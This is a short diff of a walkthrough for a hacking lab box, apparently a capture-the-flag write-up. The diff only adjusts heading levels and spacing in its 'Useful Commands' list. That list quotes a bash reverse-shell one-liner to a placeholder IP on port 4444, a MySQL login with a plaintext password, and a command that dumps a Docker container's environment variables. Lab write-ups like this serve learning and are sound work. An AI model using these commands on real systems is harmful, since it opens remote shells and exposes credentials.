@@ -386,10 +386,12 @@ With root, there is full shell access!
 
 A reflection of what was learned through this box. 
 
-## Useful Commands
+### Useful Commands
 
 **Bash Reverse Shell**: `bash -c "bash -i >&/dev/tcp/<IP>/4444 0>&1"`
+
 **Connect to a MySQL server and select a database**: `mysql -h 127.0.0.1 -u root -pjI86kGUuj87guWr3RyF gitea`
+
 {% raw %}
 **Inspect environment variables of Docker container**: `docker-inspect "{{json .Config.Env}}" gitea`
 {% endraw %}
